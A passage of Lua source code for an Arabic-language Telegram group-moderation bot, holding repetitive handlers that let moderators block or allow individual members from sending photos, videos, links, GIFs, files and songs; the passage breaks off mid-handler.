if text and text:match('^فتح المعرفات @(.*)') and is_mod(msg) then    local username = text:match('فتح المعرفات @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockuserneam'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockuserneam:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المعرفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل الصور' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockphoto'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockphoto:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الصور (%d+)') and is_mod(msg)  then    local user = text:match('قفل الصور (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockphoto'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockphoto:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الصور @(.*)') and is_mod(msg) then    local username = text:match('قفل الصور @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockphoto'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockphoto:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الصور' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockphoto'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockphoto:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الصور (%d+)') and is_mod(msg)  then    local user = text:match('فتح الصور (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''      tahadevstorm:del('numlockphoto'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockphoto:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end   getUser(user, bot_kick)   end
if text and text:match('^فتح الصور @(.*)') and is_mod(msg) then    local username = text:match('فتح الصور @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockphoto'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockphoto:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الصور'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل الفيديو' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockved'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockved:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الفيديو (%d+)') and is_mod(msg)  then    local user = text:match('قفل الفيديو (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockved'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockved:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الفيديو @(.*)') and is_mod(msg) then    local username = text:match('قفل الفيديو @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockved'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockved:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الفيديو' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockved'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockved:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الفيديو (%d+)') and is_mod(msg)  then    local user = text:match('فتح الفيديو (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:del('numlockved'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockved:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    getUser(user, bot_kick)   end
if text and text:match('^فتح الفيديو @(.*)') and is_mod(msg) then    local username = text:match('فتح الفيديو @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockved'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockved:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الفيديو'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل الروابط' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlocklinks'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'locklinks:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الروابط (%d+)') and is_mod(msg)  then    local user = text:match('قفل الروابط (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlocklinks'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'locklinks:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الروابط @(.*)') and is_mod(msg) then    local username = text:match('قفل الروابط @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlocklinks'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'locklinks:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الروابط' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlocklinks'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'locklinks:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end     getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الروابط (%d+)') and is_mod(msg)  then    local user = text:match('فتح الروابط (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:incrby('numlocklinks'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'locklinks:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    getUser(user, bot_kick)   end
if text and text:match('^فتح الروابط @(.*)') and is_mod(msg) then    local username = text:match('فتح الروابط @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlocklinks'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'locklinks:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الروابط'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل المتحركه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockgif'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockgif:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل المتحركه (%d+)') and is_mod(msg)  then    local user = text:match('قفل المتحركه (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockgif'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockgif:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل المتحركه @(.*)') and is_mod(msg) then    local username = text:match('قفل المتحركه @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockgif'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockgif:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح المتحركه' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockgif'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockgif:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")      end   getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح المتحركه (%d+)') and is_mod(msg)  then    local user = text:match('فتح المتحركه (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:del('numlockgif'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockgif:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end    getUser(user, bot_kick)   end
if text and text:match('^فتح المتحركه @(.*)') and is_mod(msg) then    local username = text:match('فتح المتحركه @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockgif'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockgif:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن المتحركه'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end
if text == 'قفل الملفات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockfile'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockfile:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end  end getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^قفل الملفات (%d+)') and is_mod(msg)  then    local user = text:match('قفل الملفات (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    if tonumber(user) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,user) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    return false  end      tahadevstorm:incrby('numlockfile'..msg.chat_id_..user,10000000)   tahadevstorm:sadd(DEVSTOR..'lockfile:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end getUser(user, bot_kick) end
if text and text:match('^قفل الملفات @(.*)') and is_mod(msg) then    local username = text:match('قفل الملفات @(.*)')    function kick_username(extra,result,success)    if result.id_ then     if tonumber(result.id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')    else    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md")    else    tahadevstorm:incrby('numlockfile'..msg.chat_id_..result.id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockfile:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end end end end    saddbyusername(username,kick_username)    end
if text == 'فتح الملفات' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    tahadevstorm:del('numlockfile'..msg.chat_id_..result.sender_user_id_)   tahadevstorm:srem(DEVSTOR..'lockfile:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")    end     getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kick_by_reply)    end
if text and text:match('^فتح الملفات (%d+)') and is_mod(msg)  then    local user = text:match('فتح الملفات (%d+)')     function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''   tahadevstorm:del('numlockfile'..msg.chat_id_..user)   tahadevstorm:srem(DEVSTOR..'lockfile:ban'..msg.chat_id_,user)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..user..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end   getUser(user, bot_kick)   end
if text and text:match('^فتح الملفات @(.*)') and is_mod(msg) then    local username = text:match('فتح الملفات @(.*)')    function kick_username(extra,result,success)    if result.id_ then     tahadevstorm:del('numlockfile'..msg.chat_id_..result.id_)   tahadevstorm:srem(DEVSTOR..'lockfile:ban'..msg.chat_id_,result.id_)      zo = '*◗💢¦* العضــو [ @'..username..' ]\n*◗🚸¦ الايــدي { '..result.id_..' }*\n*◗📛¦* تـم الغـاء منـعه مـن الملفات'   storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, "md")     end     end    saddbyusername(username,kick_username)    end   
if text == 'قفل الاغاني' and tonumber(msg.reply_to_message_id_) > 0 and is_mod(msg) then    function kick_by_reply(extra, result, success)    if not msg.can_be_deleted_ == true then    storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦* يرجى ترقيتي ادمن هنا ◖🍃\n", 1, "md")    else    if tonumber(result.sender_user_id_) == tonumber(bot_id) then     storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرا لا تستطيع حظر او كتم او طرد او تقيد البوت 💢*', 1, 'md')     return false  end    if storm3(msg.chat_id_,result.sender_user_id_) then    storm_sendMsg(msg.chat_id_, msg.id_, 1, '*◗🚨¦ عذرآ لا تستطيع منع الارسال من ال(مدراء و المنشئين) 💢*', 1, 'md')   return false  end     tahadevstorm:incrby('numlockmusc'..msg.chat_id_..result.sender_user_id_,160000066)   tahadevstorm:sadd(DEVSTOR..'lockmusc:ban'..msg.chat_id_,result.sender_user_id_)      zo = '*◗💢¦* العضــو [ '..get_username(result.sender_user_id_)..' ]\n*◗🚸¦ الايــدي { '..result.sender_user_id_..' }*\n*◗📛¦* تـم منعـه مـن ارســال الاغاني'   